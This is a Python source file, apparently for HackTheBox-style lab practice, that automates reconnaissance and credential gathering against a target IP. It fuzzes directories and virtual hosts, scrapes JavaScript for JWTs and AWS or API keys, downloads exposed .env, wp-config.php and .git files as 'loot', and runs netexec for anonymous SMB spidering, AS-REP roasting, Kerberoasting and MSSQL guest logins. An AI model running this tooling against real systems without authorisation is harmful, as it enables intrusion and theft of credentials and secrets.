import asyncio
import os
import json
import signal
import sys
import xml.etree.ElementTree as ET
import uuid
import urllib.request
import urllib.error
import re
import ssl
import socket
import random
from urllib.parse import urlparse
from rich.console import Console
from rich.panel import Panel

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2-beta Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
]

console = Console()
SECLISTS_BASE = ""


class StateManager:
    def __init__(self, state_file):
        self.state_file = state_file
        self.state = self.load_state()

    def load_state(self):
        import os, json
        if os.path.exists(self.state_file):
            try:
                with open(self.state_file, "r") as f:
                    return json.load(f)
            except:
                pass
        return {"steps": {}, "data": {}}

    def save_state(self):
        import json
        with open(self.state_file, "w") as f:
            json.dump(self.state, f, indent=4)

    def is_completed(self, step_name):
        return self.state["steps"].get(step_name, False)

    def mark_completed(self, step_name):
        self.state["steps"][step_name] = True
        self.save_state()

    def set_data(self, key, value):
        self.state["data"][key] = value
        self.save_state()

    def get_data(self, key, default=None):
        return self.state["data"].get(key, default)


class ProcessManager:
    def __init__(self, target_ip, base_dir):
        self.target_ip = target_ip
        self.base_dir = base_dir
        self.log_dir = os.path.join(base_dir, f"htb_{target_ip}", "logs")
        self.loot_dir = os.path.join(base_dir, f"htb_{target_ip}", "loot")
        os.makedirs(self.log_dir, exist_ok=True)
        os.makedirs(self.loot_dir, exist_ok=True)
        self.tasks = []
        self._shutdown = False

    async def run(self, cmd, log_name, timeout=600):
        if self._shutdown: return None
        log_file = os.path.join(self.log_dir, f"{log_name}.log")
        console.print(f"[cyan][*] Esecuzione:[/cyan] {cmd}")
        try:
            with open(log_file, "a") as f:
                proc = await asyncio.create_subprocess_shell(
                    cmd,
                    stdout=f,
                    stderr=f,
                    start_new_session=True
                )
                self.tasks.append(proc)
                await asyncio.wait_for(proc.communicate(), timeout=timeout)
                if proc.returncode == 0:
                    console.print(f"[green][+] Completato:[/green] {log_name}")
                else:
                    console.print(f"[red][-] Errore in:[/red] {log_name} (Code: {proc.returncode})")
                return proc.returncode
        except asyncio.TimeoutError:
            console.print(f"[yellow][!] Timeout raggiunto per {log_name}. Termino il processo![/yellow]")
            if proc:
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                except Exception:
                    pass
            return -1

    async def run_and_capture(self, cmd, log_name, timeout=600):
        if self._shutdown: return None, ""
        log_file = os.path.join(self.log_dir, f"{log_name}.log")
        console.print(f"[cyan][*] Esecuzione (Capture):[/cyan] {cmd}")
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                start_new_session=True
            )
            self.tasks.append(proc)
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
            
            with open(log_file, "a") as f:
                f.write(output)
                
            if proc.returncode == 0:
                console.print(f"[green][+] Completato:[/green] {log_name}")
            else:
                console.print(f"[red][-] Errore in:[/red] {log_name} (Code: {proc.returncode})")
            return proc.returncode, output
        except asyncio.TimeoutError:
            console.print(f"[yellow][!] Timeout raggiunto per {log_name}. Termino il processo![/yellow]")
            if proc:
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                except Exception:
                    pass
            return -1, ""

    def terminate_all(self):
        self._shutdown = True
        console.print("[yellow][!] Ricevuto segnale di interruzione. Pulizia in corso...[/yellow]")
        for proc in self.tasks:
            try:
                if proc.returncode is None:
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except Exception:
                pass

        try:
            os.system("pkill -9 -f nmap >/dev/null 2>&1; pkill -9 -f ffuf >/dev/null 2>&1; pkill -9 -f nuclei >/dev/null 2>&1; pkill -9 -f gowitness >/dev/null 2>&1")
        except Exception:
            pass

        state_file = os.path.join(self.base_dir, f"htb_{self.target_ip}", "state.json")
        with open(state_file, "w") as f:
            json.dump({"status": "interrupted"}, f)
        console.print("[green][+] Stato salvato in state.json. Uscita.[/green]")
        sys.exit(0)


class WebScrubber:
    def __init__(self, target_ip, port, domain, pm, sm):
        self.target_ip = target_ip
        self.port = port
        self.domain = domain
        self.pm = pm
        self.sm = sm
        protocol = "https" if str(port) in ["443", "8443"] else "http"
        self.base_url = f"{protocol}://{target_ip}:{port}"
    
    async def run_all(self):
        console.print(f"[cyan][*] Inizio WebScrubber Context-Aware su {self.base_url}[/cyan]")
        
        # 1. Tech-Stack Profiling
        if not self.sm.is_completed(f"web_profile_{self.port}"):
            html_body = await self._profile_target()
            self.sm.set_data(f"html_body_{self.port}", html_body)
            self.sm.mark_completed(f"web_profile_{self.port}")
        else:
            console.print(f"[+] Profiling già completato su porta {self.port}. Skipping...")
            html_body = self.sm.get_data(f"html_body_{self.port}", "")
            
        # 1.5 WPScan Auto-Routing
        is_wp = self.sm.get_data(f"is_wp_{self.port}", False)
        if is_wp:
            wp_scanner = WPSecScanner(self.base_url, self.port, self.pm, self.sm)
            await wp_scanner.run_all()

        # 2. JS Spidering & Endpoint Extraction (Solo se SPA rilevata)
        is_spa = self.sm.get_data(f"is_spa_{self.port}", False)
        endpoints = []
        if is_spa:
            if not self.sm.is_completed(f"web_spider_{self.port}"):
                endpoints = await self._extract_js_endpoints(html_body)
                self.sm.mark_completed(f"web_spider_{self.port}")
            else:
                console.print(f"[+] JS Spidering già completato su porta {self.port}. Skipping...")
                endpoints = self.sm.get_data(f"js_endpoints_{self.port}", [])
                
        # 3. Wildcard DNS Check (Pre-Flight)
        has_wildcard, baseline_words = await self._check_wildcard()
        
        # 4. VHOST Enumeration (OSINT + FFUF)
        vhosts = []
        if not self.sm.is_completed(f"web_vhosts_{self.port}"):
            crt_vhosts = await self._osint_vhosts()
            if crt_vhosts:
                console.print(f"[bold green][+] OSINT: Trovati {len(crt_vhosts)} sottodomini su crt.sh![/bold green]")
            
            ffuf_vhosts = await self._fuzz_vhosts(has_wildcard, baseline_words)
            
            # Unisci e deduplica
            vhosts = list(set(crt_vhosts + ffuf_vhosts))
            
            self.sm.set_data(f"vhosts_{self.port}", vhosts)
            self.sm.mark_completed(f"web_vhosts_{self.port}")
        else:
            console.print(f"[+] VHOST Enumeration già completata su porta {self.port}. Skipping...")
            vhosts = self.sm.get_data(f"vhosts_{self.port}", [])
        
        # 5. Dynamic Directory Fuzzing (FFUF) con supporto VHOST e API Targeted
        if not self.sm.is_completed(f"web_dirs_{self.port}"):
            await self._fuzz_directories(vhosts, endpoints)
            self.sm.mark_completed(f"web_dirs_{self.port}")
        else:
            console.print(f"[+] Directory Fuzzing già completato su porta {self.port}. Skipping...")
        
        # 6. Vulnerability & CVE Scanning (Nuclei) con VHOST Injection
        if not self.sm.is_completed(f"web_nuclei_{self.port}"):
            await self._scan_nuclei(vhosts)
            self.sm.mark_completed(f"web_nuclei_{self.port}")
        else:
            console.print(f"[+] Scansione Nuclei già completata su porta {self.port}. Skipping...")
        
        # 7. Visual Reconnaissance (Gowitness)
        if not self.sm.is_completed(f"web_gowitness_{self.port}"):
            # Gowitness non supporta VHost custom headers via url-list in modo triviale. Usiamo l'IP di base.
            targets = [self.base_url]
            await self._run_gowitness(targets)
            self.sm.mark_completed(f"web_gowitness_{self.port}")
        else:
            console.print(f"[+] Visual Reconnaissance già completata su porta {self.port}. Skipping...")
            
    async def _profile_target(self):
        console.print("[cyan][*] Tech-Stack Profiling in corso...[/cyan]")
        
        # WAF Detection & Dynamic Throttling check
        console.print("[cyan][*] Controllo presenza WAF con wafw00f...[/cyan]")
        has_waf = False
        try:
            rc, output = await self.pm.run_and_capture(f"wafw00f {self.base_url}", f"wafw00f_{self.port}", timeout=60)
            output_lower = output.lower()
            if "no waf detected" not in output_lower and ("is behind" in output_lower or "detected" in output_lower):
                has_waf = True
            elif "detected" in output_lower and "waf" in output_lower:
                has_waf = True
        except Exception:
            pass
            
        self.sm.set_data(f"has_waf_{self.port}", has_waf)
        if has_waf:
            console.print(Panel("[bold red blink][!] ALERT: Rilevato WAF sul target! Verrà abilitato il Dynamic Throttling per FFuF.[/bold red blink]", border_style="red"))

        def fetch():
            try:
                req = urllib.request.Request(self.base_url, headers={"User-Agent": random.choice(USER_AGENTS)})
                with urllib.request.urlopen(req, timeout=10) as r:
                    return r.read().decode('utf-8', errors='ignore'), dict(r.headers)
            except urllib.error.HTTPError as e:
                # Per i profiler ci va bene analizzare anche le 401/403/404 per le app react
                return e.read().decode('utf-8', errors='ignore'), dict(e.headers)
            except Exception as e:
                return "", {}

        html, headers = await asyncio.to_thread(fetch)
        
        # --- Auto-CEWL: Estrazione dinamica wordlist ---
        import re
        custom_words = re.findall(r'\b[a-zA-Z]{5,20}\b', html)
        if custom_words:
            unique_words = set(w.lower() for w in custom_words)
            custom_wordlist_path = os.path.join(self.pm.loot_dir, "custom_wordlist.txt")
            with open(custom_wordlist_path, "w") as f:
                f.write("\n".join(unique_words) + "\n")
            console.print(f"[green][+] Auto-CEWL: Create {len(unique_words)} parole custom in custom_wordlist.txt[/green]")

        is_spa = False
        is_api = False
        
        # Analizza Header HTTP per firme Node/Express
        server_header = headers.get("Server", "").lower()
        powered_by = headers.get("X-Powered-By", "").lower()
        if "express" in powered_by or "node" in powered_by or "sails" in powered_by or "node" in server_header:
            is_api = True
        
        # Analizza HTML per i footprint delle SPA (Vue/React dev builds o container)
        if re.search(r'<div id="(?:root|app)">', html, re.I) or "react" in html.lower() or "vue" in html.lower() or "webpack" in html.lower():
            is_spa = True
            
        is_wp = False
        if "/wp-content/" in html or "/wp-includes/" in html or '<meta name="generator" content="WordPress' in html:
            is_wp = True
            
        self.sm.set_data(f"is_spa_{self.port}", is_spa)
        self.sm.set_data(f"is_api_{self.port}", is_api)
        self.sm.set_data(f"is_wp_{self.port}", is_wp)
        
        if is_spa: console.print(Panel("[bold magenta][+] Profiling: SPA Rilevata (React/Vue/ecc.)[/bold magenta]", border_style="magenta"))
        if is_api: console.print(Panel("[bold magenta][+] Profiling: Backend API Rilevato (Node/Express)[/bold magenta]", border_style="cyan"))
        if is_wp: console.print(Panel("[bold magenta][+] Profiling: CMS WordPress Rilevato[/bold magenta]", border_style="green"))
        
        # --- Swagger / OpenAPI Hunter ---
        console.print("[cyan][*] Ricerca documentazione API (Swagger/OpenAPI)...[/cyan]")
        api_paths = ["/swagger.json", "/api/swagger.json", "/v1/api-docs", "/v2/api-docs", "/openapi.yaml"]
        
        def fetch_api_doc(path):
            try:
                url = f"{self.base_url}{path}"
                req = urllib.request.Request(url, headers={"User-Agent": random.choice(USER_AGENTS)})
                with urllib.request.urlopen(req, timeout=5) as r:
                    if r.status == 200:
                        body = r.read().decode('utf-8', errors='ignore')
                        if body.strip().startswith('{') or 'swagger:' in body or 'openapi:' in body:
                            return path, body
            except Exception:
                pass
            return None, None

        api_tasks = [asyncio.to_thread(fetch_api_doc, p) for p in api_paths]
        api_results = await asyncio.gather(*api_tasks)
        
        for path, body in api_results:
            if path and body:
                out_name = "openapi_found.txt" if "openapi" in path else "swagger_found.txt"
                out_path = os.path.join(self.pm.loot_dir, out_name)
                with open(out_path, "w") as f:
                    f.write(body)
                console.print(Panel(f"[bold green blink][!] BINGO! Documentazione API rubata su {path}[/bold green blink]\nSalvata in: {out_path}", border_style="green"))
                break # Evitiamo duplicati se ci sono alias

        endpoints = set()
        
        # Estrai i source <script src="app.js">
        scripts = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', html, re.IGNORECASE)
        
        def fetch_js(url):
            try:
                # Rendi assoluti i path shadowati
                if not url.startswith("http"):
                    url = f"{self.base_url}/{url.lstrip('/')}"
                req = urllib.request.Request(url, headers={"User-Agent": random.choice(USER_AGENTS)})
                with urllib.request.urlopen(req, timeout=10) as r:
                    content_type = r.headers.get('Content-Type', '').lower()
                    if 'application/' in content_type and 'javascript' not in content_type: return ""
                    if 'image/' in content_type: return ""
                    return r.read().decode('utf-8', errors='ignore')
            except:
                return ""
                
        # Effettuiamo un read parallelo dei chunk JS
        if scripts:
            console.print(f"[cyan][*] Download parallelo di {len(scripts)} file JS...[/cyan]")
            tasks = [asyncio.to_thread(fetch_js, script) for script in scripts]
            results = await asyncio.gather(*tasks)
            
            for script, js_content in zip(scripts, results):
                if not js_content: continue
                # Regex aggressiva ma efficace per path HTTP/API validi senza matchare troppi falsi positivi
                # Filtra stringhe che assomigliano a mime-types
                matches = re.findall(r'/(?:api|v1|v2|graphql|rest)(?:/[a-zA-Z0-9_.-]+)+', js_content, re.IGNORECASE)
                valid_matches = [m for m in matches if not any(x in m.lower() for x in ['application/', 'text/', 'image/', 'video/'])]
                endpoints.update(valid_matches)
                
                # In-Memory Secret Hunter
                secrets_found = set()
                jwts = re.findall(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}', js_content)
                aws_keys = re.findall(r'AKIA[0-9A-Z]{16}', js_content)
                api_keys = re.findall(r'api[_-]?key[\'"]?\s*[:=]\s*[\'"]?([a-zA-Z0-9\-]{20,})[\'"]?', js_content, re.IGNORECASE)
                
                for j in jwts: secrets_found.add(f"JWT: {j}")
                for a in aws_keys: secrets_found.add(f"AWS: {a}")
                for ak in api_keys: secrets_found.add(f"API_KEY: {ak}")
                
                if secrets_found:
                    secrets_file = os.path.join(self.pm.loot_dir, "secrets.txt")
                    with open(secrets_file, "a") as sf:
                        for s in secrets_found:
                            sf.write(f"{s}\n")
                    for s in secrets_found:
                        console.print(f"[bold green][+] Segreto Rilevato in JS: {s}[/bold green]")
                        
        endpoints_list = list(endpoints)
        if endpoints_list:
            console.print(f"[bold green][+] JS Spidering completato: Trovati {len(endpoints_list)} endpoint API coperti nei bundle JS![/bold green]")
            for ep in endpoints_list:
                console.print(f"    - {ep}")
                
        self.sm.set_data(f"js_endpoints_{self.port}", endpoints_list)
        return endpoints_list
        
    async def _check_wildcard(self):
        if not self.domain:
            return False, 0
            
        random_sub = f"{uuid.uuid4().hex[:8]}.{self.domain}"
        
        def fetch():
            try:
                req = urllib.request.Request(self.base_url, headers={"Host": random_sub, "User-Agent": random.choice(USER_AGENTS)})
                with urllib.request.urlopen(req, timeout=5) as response:
                    return response.read(), response.status
            except urllib.error.HTTPError as e:
                return e.read(), e.code
            except Exception:
                return None, 0

        body, status = await asyncio.to_thread(fetch)
        if status in [200, 301, 302] and body:
            words = len(body.split())
            console.print(f"[yellow][!] Wildcard DNS rilevato risorsa default! Baseline parole: {words}[/yellow]")
            return True, words
        return False, 0

    async def _osint_vhosts(self):
        if not self.domain or self.domain == "target.htb":
            return []
        
        console.print("[cyan][*] OSINT VHOST Recon (crt.sh)...[/cyan]")
        url = f"https://crt.sh/?q=%.{self.domain}&output=json"
        
        def fetch_crt():
            try:
                req = urllib.request.Request(url, headers={"User-Agent": random.choice(USER_AGENTS)})
                with urllib.request.urlopen(req, timeout=7) as response:
                    return response.read()
            except Exception:
                return b""
        
        body = await asyncio.to_thread(fetch_crt)
        if not body:
            return []
            
        try:
            data = json.loads(body)
            subs = set()
            for entry in data:
                nv = entry.get("name_value", "")
                for sub in nv.split('\n'):
                    cl = sub.strip()
                    if cl.startswith("*."):
                        cl = cl[2:]
                    if cl and cl != self.domain:
                        subs.add(cl)
            return list(subs)
        except json.JSONDecodeError:
            console.print("[yellow][!] Risposta JSON da crt.sh non valida.[/yellow]")
            return []
        except Exception:
            return []

    async def _fuzz_vhosts(self, has_wildcard, baseline_words):
        if not self.domain: 
            return []
            
        console.print("[cyan][*] Inizio VHOST Fuzzing...[/cyan]")
        has_waf = self.sm.get_data(f"has_waf_{self.port}", False)
        
        if has_waf:
            ffuf_speed = "-t 10 -p 0.5"
        else:
            if getattr(self.pm, "profile", "normal") == "aggressive":
                ffuf_speed = "-t 100"
            elif getattr(self.pm, "profile", "normal") == "stealth":
                ffuf_speed = "-t 5 -p 1.0"
            else:
                ffuf_speed = "-t 40"

        out_json = os.path.join(self.pm.log_dir, f"vhosts_{self.port}.json")
        wordlist = f"{SECLISTS_BASE}/Discovery/DNS/subdomains-top1million-5000.txt"
        ua = random.choice(USER_AGENTS)
        cmd = f"ffuf -ac {ffuf_speed} -w {wordlist} -u {self.base_url} -H 'Host: FUZZ.{self.domain}' -H 'User-Agent: {ua}' -of json -o {out_json}"

        if has_wildcard:
            cmd += f" -fw {baseline_words}"
            
        await self.pm.run(cmd, f"ffuf_vhosts_{self.port}", timeout=600)
        
        valid_vhosts = []
        if os.path.exists(out_json):
            try:
                with open(out_json, "r") as f:
                    try:
                        data = json.load(f)
                    except json.JSONDecodeError:
                        console.print("[yellow][!] File JSON corrotto o incompleto, salto il parsing.[/yellow]")
                        data = {"results": []}

                    for res in data.get("results", []):
                        vhost = f"{res['host']}" # FFUF logga il payload
                        full_vhost = f"{vhost}.{self.domain}" if vhost != self.domain else vhost
                        valid_vhosts.append(full_vhost)
                        console.print(f"[bold green][+] Trovato VHOST valido: {full_vhost}[/bold green]")
                        console.print(f"[yellow][!] [Auto-Pwn] Aggancio HOST logic saltando l'alterazione del file /etc/hosts via curl injection.[/yellow]")
            except Exception as e:
                console.print(f"[red][-] Errore lettura risultati ffuf: {e}[/red]")
                
        return valid_vhosts

    async def _fuzz_directories(self, vhosts, endpoints):
        console.print("[cyan][*] Inizio Directory Fuzzing Context-Aware (Stage 1)...[/cyan]")
        has_waf = self.sm.get_data(f"has_waf_{self.port}", False)
        
        if has_waf:
            ffuf_speed = "-t 10 -p 0.5"
        else:
            if getattr(self.pm, "profile", "normal") == "aggressive":
                ffuf_speed = "-t 100"
            elif getattr(self.pm, "profile", "normal") == "stealth":
                ffuf_speed = "-t 5 -p 1.0"
            else:
                ffuf_speed = "-t 40"

        wordlist_base = f"{SECLISTS_BASE}/Discovery/Web-Content/raft-small-words.txt"
        wordlist_api = f"{SECLISTS_BASE}/Discovery/Web-Content/common-api-endpoints-ma-v1.txt" # Oppure un common-api.txt
        
        # --- Auto-CEWL Integration ---
        custom_wordlist = os.path.join(self.pm.loot_dir, "custom_wordlist.txt")
        w_flags = f"-w {wordlist_base}"
        if os.path.exists(custom_wordlist) and os.path.getsize(custom_wordlist) > 0:
            w_flags += f" -w {custom_wordlist}"

        targets = [{"url": self.base_url, "host": None}]
        for vh in vhosts:
            targets.append({"url": self.base_url, "host": vh})
            
        def display_ffuf_results(json_file_path):
            if os.path.exists(json_file_path):
                try:
                    with open(json_file_path, "r") as f:
                        try:
                            data = json.load(f)
                        except json.JSONDecodeError:
                            console.print("[yellow][!] File JSON corrotto o incompleto, salto il parsing.[/yellow]")
                            data = {"results": []}
                            
                        found = []
                        for res in data.get("results", []):
                            if res["status"] in [200, 201, 301, 302, 401, 403]:
                                fuzz_val = res['input']['FUZZ']
                                found.append(f"/{fuzz_val} [Status: {res['status']}]")
                                
                                # Auto-Dumper dei file critici (Juicy Files)
                                if res["status"] == 200 and (fuzz_val in [".env", "config.php", "wp-config.php", ".git/config"] or fuzz_val == ".git" or fuzz_val.startswith(".git/")):
                                    file_url = res.get('url', f"{self.base_url}/{fuzz_val}")
                                    
                                    if ".git" in fuzz_val:
                                        console.print(Panel(
                                            f"[bold red]REPOSITORY GIT ESPOSTO![/bold red]\nEsegui questo comando per estrarre l'intero sorgente:\n[bold cyan]git-dumper {self.base_url}/.git/ {self.pm.loot_dir}/git_repo/[/bold cyan]",
                                            title="CRITICAL ALERT", border_style="red blink"
                                        ))
                                        
                                    console.print(f"[bold red blink][!] AUTO-DUMPER: Esfiltrazione di {fuzz_val} in corso...[/bold red blink]")
                                    def dump_juicy_file(url, fname):
                                        try:
                                            req = urllib.request.Request(url, headers={"User-Agent": random.choice(USER_AGENTS)})
                                            with urllib.request.urlopen(req, timeout=10) as r:
                                                content = r.read()
                                                safe_fname = fname.replace('/', '_')
                                                with open(os.path.join(self.pm.loot_dir, safe_fname), "wb") as wf:
                                                    wf.write(content)
                                        except Exception:
                                            pass
                                    asyncio.create_task(asyncio.to_thread(dump_juicy_file, file_url, fuzz_val))

                        if found:
                            console.print(f"[bold green]Risultati interessanti trovati:[/bold green]")
                            for p in found:
                                console.print(f"  └─ {p}")
                except Exception as e:
                    pass

        for t in targets:
            # Dynamic HTTP Host Injection senza dipendere da /etc/hosts
            host_flag = f"-H 'Host: {t['host']}'" if t['host'] else ""
            host_flag += f" -H 'User-Agent: {random.choice(USER_AGENTS)}'"
            host_label = t['host'] if t['host'] else "base_ip"
            
            # --- STAGE 1: Standard Fuzzing ---
            out_base = os.path.join(self.pm.log_dir, f"dirs_{self.port}_{host_label}.json")
            cmd_base = f"ffuf {w_flags} {ffuf_speed} -u {t['url']}/FUZZ {host_flag} -ac -of json -o {out_base}"
            await self.pm.run(cmd_base, f"ffuf_dirs_{self.port}_{host_label}", timeout=600)
            display_ffuf_results(out_base)
            
            # --- STAGE 2: API Targeted (Solo se rilevata SPA/Endpoints) ---
            if endpoints:
                console.print(f"[cyan][*] Stage 2: API Targeted Fuzzing (Metodi multipli) per {host_label}...[/cyan]")
                
                # Normalizza ed estrae il root API prefix (es. /api/v1/users -> /api/v1)
                prefixes = set()
                for ep in endpoints:
                    parts = [p for p in ep.split('/') if p]
                    if len(parts) >= 2:
                        prefixes.add(f"/{parts[0]}/{parts[1]}")
                    elif len(parts) == 1:
                        prefixes.add(f"/{parts[0]}")
                        
                for prefix in prefixes:
                    out_api = os.path.join(self.pm.log_dir, f"api_fuzz_{self.port}_{host_label}_{prefix.replace('/', '_')}.json")
                    # Istruiamo FFUF a fuzzare il blocco API specifico e abilitare codici HTTP custom tipici delle API Rest (-mc 200,201,400,401,403,405)
                    cmd_api = f"ffuf -w {wordlist_api} {ffuf_speed} -u {t['url']}{prefix}/FUZZ {host_flag} -ac -X GET -mc 200,201,400,401,403,405 -of json -o {out_api}"
                    await self.pm.run(cmd_api, f"ffuf_api_stage2_{self.port}_{host_label}_{prefix.replace('/', '_')}", timeout=600)
                    display_ffuf_results(out_api)

    async def _scan_nuclei(self, vhosts):
        console.print(f"[cyan][*] Lancio Nuclei VHOST-Aware...[/cyan]")
        
        targets = [{"url": self.base_url, "host": None}]
        for vh in vhosts:
            targets.append({"url": self.base_url, "host": vh})
            
        tags = "cves,lfi,xss,misconfiguration,default-logins,exposed-panels"
        
        for t in targets:
            host_flag = f"-H 'Host: {t['host']}'" if t['host'] else ""
            host_label = t['host'] if t['host'] else "base_ip"
            out_file = os.path.join(self.pm.log_dir, f"nuclei_{self.port}_{host_label}.txt")
            
            # Passiamo l'URL "diretto" per non far fallire la query DNS e injectiamo l'Host
            cmd = f"nuclei -c 50 -rl 300 -u {t['url']} {host_flag} -t {tags} -o {out_file}"
            await self.pm.run(cmd, f"nuclei_{self.port}_{host_label}", timeout=900)
        
            # Check for critical alerts
            if os.path.exists(out_file):
                with open(out_file, "r") as f:
                    lines = f.readlines()
                critical_high_lines = [line.strip() for line in lines if "[critical]" in line.lower() or "[high]" in line.lower()]
                if critical_high_lines:
                    excerpt = "\n".join(critical_high_lines)
                    console.print(Panel(
                        f"[bold red blink][!] Nuclei ha trovato vulnerabilità CRITICHE o HIGH sul target {host_label}![/bold red blink]\n\n[bold yellow]Dettagli:[/bold yellow]\n{excerpt}\n\nControlla i log immediatamente in {out_file}!",
                        title="VULNERABILITÀ CRITICA RILEVATA",
                        border_style="red"
                    ))

    async def _run_gowitness(self, targets):
        console.print("[cyan][*] Lancio Gowitness (Visual Reconnaissance)...[/cyan]")
        target_file = os.path.join(self.pm.log_dir, f"gowitness_targets_{self.port}.txt")
        with open(target_file, "w") as f:
            for t in targets:
                f.write(t + "\n")
                
        out_dir = os.path.join(self.pm.log_dir, "gowitness_shots")
        cmd = f"gowitness file -f {target_file} -d {out_dir} --no-sandbox"
        await self.pm.run(cmd, f"gowitness_{self.port}", timeout=300)


async def extract_domain_ssl(target_ip, port):
    console.print(f"[cyan][*] Estrazione dominio via SSL/TLS per {target_ip}:{port}...[/cyan]")
    def try_ssl():
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((target_ip, int(port)), timeout=3) as sock:
                with ctx.wrap_socket(sock, server_hostname=target_ip) as ssock:
                    cert = ssock.getpeercert()
                    # subjectAltName
                    san = cert.get('subjectAltName', ())
                    for key, value in san:
                        if key == 'DNS':
                            return value.lower()
                    # fallback to subject
                    for sub in cert.get('subject', ()):
                        for key, value in sub:
                            if key == 'commonName':
                                return value.lower()
        except Exception:
            return None
        return None
        
    domain = await asyncio.to_thread(try_ssl)
    if domain and not domain.startswith("localhost") and "*" not in domain:
        console.print(f"[bold green][+] Dominio estratto da SSL: {domain}[/bold green]")
        return domain
    return None

async def extract_domain(target_ip, pm):
    console.print(f"[cyan][*] Estrazione dominio via SMB per {target_ip}...[/cyan]")
    cmd = f"netexec smb {target_ip}"
    
    # Run the command and capture output instead of writing to log directly using a dedicated subprocess
    import asyncio
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
        output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
        
        # Save output to log as well
        log_file = os.path.join(pm.log_dir, "extract_domain.log")
        with open(log_file, "w") as f:
            f.write(output)
            
        import re
        match = re.search(r'domain:([^\s]+)', output, re.IGNORECASE)
        if match:
            domain = match.group(1).strip()
            console.print(f"[bold green][+] Dominio estratto: {domain}[/bold green]")
        elif match_name := re.search(r'name:([^\s]+)', output, re.IGNORECASE):
            name = match_name.group(1).strip()
            domain = f"{name}.htb".lower()
            console.print(f"[yellow][!] Dominio non trovato, fallback su hostname: {domain}[/yellow]")
        else:
            domain = None
            
        if domain:
            with open(os.path.join(pm.loot_dir, "domain.txt"), "w") as df:
                df.write(domain)
            return domain
            
    except Exception as e:
        console.print(f"[red][-] Errore estrazione dominio: {e}[/red]")
        
    console.print("[yellow][!] Estrazione dominio fallita, uso default: target.htb[/yellow]")
    return "target.htb"

class WPSecScanner:
    def __init__(self, base_url, port, pm, sm):
        self.base_url = base_url
        self.port = port
        self.pm = pm
        self.sm = sm

    async def run_all(self):
        console.print(f"[cyan][*] Inizio WPSecScanner su {self.base_url}[/cyan]")
        if not self.sm.is_completed(f"web_wpscan_{self.port}"):
            console.print("[cyan][*] Scansione WPScan (Plugins, Users, Themes)...[/cyan]")
            cmd = f"wpscan --url {self.base_url} --enumerate u,vp,vt --plugins-detection aggressive"
            await self.pm.run(cmd, f"wpscan_{self.port}", timeout=600)
            self.sm.mark_completed(f"web_wpscan_{self.port}")
        else:
            console.print(f"[+] Scansione WPScan già completata su porta {self.port}. Skipping...")


class ADScout:
    def __init__(self, target_ip, pm, sm):
        self.target_ip = target_ip
        self.pm = pm
        self.sm = sm

    async def run_all(self):
        console.print(f"[cyan][*] Inizio ADScout su {self.target_ip}[/cyan]")
        
        # 1. SMB Enumeration
        if not self.sm.is_completed("ad_smb_enum"):
            console.print("[cyan][*] Enumerazione SMB (anonymous access & pass-pol)...[/cyan]")
            cmd_smb = f"netexec smb {self.target_ip} -u '' -p '' --shares --pass-pol"
            rc, output = await self.pm.run_and_capture(cmd_smb, "adscout_smb_enum", timeout=300)
            
            if "READ" in output.upper():
                console.print("[bold cyan][*] Accesso in lettura SMB rilevato! Modulo spider_plus avviato in background. Controlla /tmp/cme_spider_plus a fine scansione.[/bold cyan]")
                spider_cmd = f"netexec smb {self.target_ip} -u '' -p '' -M spider_plus"
                asyncio.create_task(self.pm.run(spider_cmd, f"adscout_smb_spider_{self.target_ip}", timeout=600))
                
            self.sm.mark_completed("ad_smb_enum")
        else:
            console.print("[+] Enumerazione SMB già completata. Skipping...")
        
        # 2. LDAP Enumeration
        if not self.sm.is_completed("ad_ldap_enum"):
            console.print("[cyan][*] Enumerazione LDAP (anonymous bind & users)...[/cyan]")
            cmd_ldap = f"netexec ldap {self.target_ip} -u '' -p '' --users --asreproast asrep.txt --kerberoasting kerb.txt"
            await self.pm.run(cmd_ldap, "adscout_ldap_enum", timeout=300)
            self.sm.mark_completed("ad_ldap_enum")
        else:
            console.print("[+] Enumerazione LDAP già completata. Skipping...")
        
        # 3. AD CS Alert
        console.print(Panel(
            "[bold red][!] Dominio rilevato. Se ottieni credenziali valide, RICORDA di lanciare Certipy per check vulnerabilità ESC (es. ESC1/ESC8) su AD CS![/bold red]",
            title="Active Directory Certificate Services",
            border_style="magenta"
        ))

class MSSQLHunter:
    def __init__(self, target_ip, pm, sm):
        self.target_ip = target_ip
        self.pm = pm
        self.sm = sm

    async def run_all(self):
        console.print(f"[cyan][*] Inizio MSSQLHunter su {self.target_ip}[/cyan]")
        
        # 1. Weak Auth Check (Guest)
        if not self.sm.is_completed("mssql_guest"):
            console.print("[cyan][*] Controllo credenziali deboli (guest)...[/cyan]")
            cmd_guest = f"netexec mssql {self.target_ip} -u 'guest' -p ''"
            await self.pm.run(cmd_guest, "mssqlhunter_guest", timeout=120)
            self.sm.mark_completed("mssql_guest")
        else:
            console.print("[+] Controllo MSSQL Guest già completato. Skipping...")
        
